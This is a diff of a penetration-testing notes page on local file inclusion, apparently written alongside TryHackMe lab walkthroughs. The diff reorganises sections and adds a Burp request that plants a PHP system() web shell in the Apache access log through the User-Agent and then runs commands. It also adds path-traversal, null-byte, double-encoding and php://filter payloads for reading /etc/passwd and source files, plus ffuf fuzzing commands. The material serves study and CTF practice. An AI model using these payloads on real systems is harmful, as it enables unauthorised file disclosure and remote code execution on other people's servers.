@@ -8,6 +8,10 @@
 
 {% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}
 
+**Copy cheat sheet**
+
+[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+
 
 
 ## Basic LFI and bypasses <a href="#basic-lfi-and-bypasses" id="basic-lfi-and-bypasses"></a>
@@ -180,8 +184,6 @@ os.path.join(os.getcwd(), "public", file_name)
 
 If the user passes an **absolute path** to **`file_name`**, the **previous path is just removed**:
 
-
-
 ```
 os.path.join(os.getcwd(), "public", "/etc/passwd")
 '/etc/passwd'
@@ -309,24 +311,13 @@ In the original post you can find a detailed explanation of the technique, but h
 
 In the post a tool to perform this automatically was also leaked: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).
 
-## &#x20;
-
-##
-
-##
-
-## Find other php pages
-
-**Kali**
-
-```
-ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt > results.txt
-cat results.txt | grep -v 2422
-```
-
 
 
 ## Find system level files
+
+**Examples**
+
+[watcher.md](../../walkthroughs/tryhackme/watcher.md "mention")
 
 Can use the list below to fill mylist.txt
 
@@ -336,6 +327,100 @@ Can use the list below to fill mylist.txt
 ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w mylist.txt > results.txt
 cat results.txt | grep -v 2422
 ```
+
+## Run OS Commands
+
+**Examples**
+
+[dogcat.md](../../walkthroughs/tryhackme/dogcat.md "mention")
+
+**Burp**
+
+```
+GET /?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
+Host: 10.10.129.114
+User-Agent: <?php system($_GET['cmd']);?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+
+
+
+
+
+
+##
+
+
+
+**PHP://** is a wrapper for Accessing various I/O streams. We&#x20;
+
+
+
+
+
+**Bypasses**
+
+<table><thead><tr><th>Bypass</th><th width="184.33333333333331">Explanation</th><th width="366.66666666666674">Example</th></tr></thead><tbody><tr><td>Bypass extension added</td><td>Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</td><td>hxxp://10.10.230.14/lab3.php?file=../../../../../etc/passwd%00</td></tr><tr><td>PHP removing slashes</td><td>This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass.</td><td>hxxp://10.10.230.14/lab3.php?file=..//..//..//..//..//etc/passwd</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>
+
+### traversal sequences stripped non-recursively
+
+```python
+http://example.com/index.php?page=....//....//....//etc/passwd
+http://example.com/index.php?page=....\/....\/....\/etc/passwd
+http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+```
+
+### **Null byte (%00)**
+
+Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")
+
+```
+http://$VICTIM/index.php?page=../../../etc/passwd%00
+```
+
+### **Base64 Encode**
+
+**Examples**
+
+[dogcat.md](../../walkthroughs/tryhackme/dogcat.md "mention")
+
+**php://filter** — it is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. There are multiple parameters to this wrapper, we will use **convert.base64-encode/resource=** — This will convert the given file into base64 encoding and print it on screen. But we have to provide the resource what we want to read like a file name **index.php**.
+
+```
+http://$VICTIM/?view=php://filter/convert.base64-encode/resource=dog
+```
+
+
+
+### **Encoding**
+
+You could use non-standard encondings like double URL encode (and others):
+
+```
+http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
+http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+
+### From existent folder
+
+Maybe the back-end is checking the folder path:
+
+```python
+http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
+```
+
+## LFI to RCE via Apache Log File Poisoning (PHP) <a href="#user-content-lfi-to-rce-via-apache-log-file-poisoning-php" id="user-content-lfi-to-rce-via-apache-log-file-poisoning-php"></a>
+
+Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
+
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -918,60 +1003,7 @@ chmod +x script.sh
 
 
 
-**Copy cheat sheet**
-
-[https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 
 
 
-**PHP://** is a wrapper for Accessing various I/O streams. We&#x20;
-
-**php://filter** — it is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. There are multiple parameters to this wrapper, we will use **convert.base64-encode/resource=** — This will convert the given file into base64 encoding and print it on screen. But we have to provide the resource what we want to read like a file name **index.php**.
-
-
-
-**Bypasses**
-
-<table><thead><tr><th>Bypass</th><th width="184.33333333333331">Explanation</th><th width="366.66666666666674">Example</th></tr></thead><tbody><tr><td>Bypass extension added</td><td>Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</td><td>hxxp://10.10.230.14/lab3.php?file=../../../../../etc/passwd%00</td></tr><tr><td>PHP removing slashes</td><td>This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass.</td><td>hxxp://10.10.230.14/lab3.php?file=..//..//..//..//..//etc/passwd</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>
-
-### traversal sequences stripped non-recursively
-
-```python
-http://example.com/index.php?page=....//....//....//etc/passwd
-http://example.com/index.php?page=....\/....\/....\/etc/passwd
-http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
-```
-
-### **Null byte (%00)**
-
-Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")
-
-```
-http://example.com/index.php?page=../../../etc/passwd%00
-```
-
-### **Encoding**
-
-You could use non-standard encondings like double URL encode (and others):
-
-```
-http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
-http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
-http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
-http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
-```
-
-### From existent folder
-
-Maybe the back-end is checking the folder path:
-
-```python
-http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
-```
-
-## LFI to RCE via Apache Log File Poisoning (PHP) <a href="#user-content-lfi-to-rce-via-apache-log-file-poisoning-php" id="user-content-lfi-to-rce-via-apache-log-file-poisoning-php"></a>
-
-Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
-
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
